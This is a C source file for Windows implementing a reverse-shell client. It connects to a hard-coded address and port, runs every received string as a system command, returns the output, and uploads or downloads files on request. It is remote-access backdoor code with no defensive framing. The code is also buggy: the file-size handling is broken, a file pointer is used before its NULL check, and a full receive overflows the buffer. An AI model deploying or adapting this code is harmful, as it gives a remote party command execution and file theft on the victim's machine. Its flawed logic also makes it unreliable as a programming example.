#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080
#define BUFFER_SIZE 4096

int prefix(const char *pre, const char *str) {
    return strncmp(pre, str, strlen(pre)) == 0;
}

void send_result(SOCKET sock, const char *command) {
    char buffer[BUFFER_SIZE];
    FILE *fp;
    fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to run command!\n");
        return;
    }
    while(fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (send(sock, buffer, strlen(buffer), 0) < 0) {
            printf("Failed to send: %d\n", WSAGetLastError());
            break;
        }
    }
    _pclose(fp);
}

void receive_file(SOCKET sock, const char *filename) {
    FILE *file = fopen(filename, "wb");
    char buffer[BUFFER_SIZE];
    char storedFileSize[1];
    int received;
    if (file == NULL) {
        printf("Failed to open file\n");
        return;
    }
    printf("Start received file size\n");
    if (received = recv(sock, storedFileSize, 1, 0) < 0) {
        printf("Failed to received file size!\n");
    }
    printf("Received file size before : %s\n", storedFileSize);
    long long int file_size = atoll(storedFileSize);
    memset(buffer, 0, sizeof(buffer));
    printf("Received file size: %lld\n", file_size);
    int total = 0;
    int count = 0;
    while(total < file_size && received != -100000) {
        received = recv(sock, buffer, sizeof(buffer), 0);
        printf("Received %d data set and counting %d\n", received, count++);
        if (received <= 0) {
            printf("Failed to received file %d\n", WSAGetLastError());
            break;
        }
        fwrite(buffer, 1, received, file);
        total += received;
    }
    fclose(file);
    printf("File received successfully.\n");
    return;
}
void send_file(SOCKET sock, const char *filename) {
    FILE *file = fopen(filename, "rb");
    char buffer[BUFFER_SIZE];
    int received;
    int read;
    int count = 0;
    fseek(file, 0, SEEK_END);
    long long int file_size = ftell(file);
    snprintf(buffer, sizeof(buffer), "%lld", file_size);
    printf("file %s has %lld now start to send file size\n", filename, file_size);
    printf("fuck the buffer %s\n", buffer);
    send(sock, buffer, strlen(buffer), 0);
    printf("Send done\n");
    int remain_data = file_size;
    if (file == NULL) {
        printf("Failed to open file\n");
        return;
    }
    printf("Start sending file!\n");
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    snprintf(buffer, BUFFER_SIZE, "%ld", file_size);
    send(sock, buffer, strlen(buffer), 0);
    printf("Send file size done!\n");
    while((read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        printf("Still sending: %d\n", count);
        if (send(sock, buffer, read, 0) < 0) {
            printf("Failed to send file: %d\n", WSAGetLastError());
            break;
        }
        count++;
    }
    printf("Send -100000\n");
    snprintf(buffer, BUFFER_SIZE, "%ld", -100000);
    send(sock, buffer, strlen(buffer), 0);
    fclose(file);
    printf("File send in client success\n");
    return;
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int recv_size;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket: %d\n", WSAGetLastError());
        return 1;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connect failed with error code: %d\n", WSAGetLastError());
        return 1;
    }

    while (1) {
        if ((recv_size = recv(sock, buffer, BUFFER_SIZE, 0)) == SOCKET_ERROR) {
            printf("Recv failed with error code: %d\n", WSAGetLastError());
            break;
        }
        buffer[recv_size] = '\0';

        printf("Received: %s\n", buffer);
        if (prefix("puts ", buffer)) {
            printf("Start receive file\n");
            char filename[BUFFER_SIZE];
            sscanf(buffer + 5, "%s", filename);
            receive_file(sock, filename);
        } else if (prefix("gets ", buffer)) {
            printf("Start send file\n");
            char filename[BUFFER_SIZE];
            sscanf(buffer + 5, "%s", filename);
            send_file(sock, filename);
        } else {
            send_result(sock, buffer);
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}
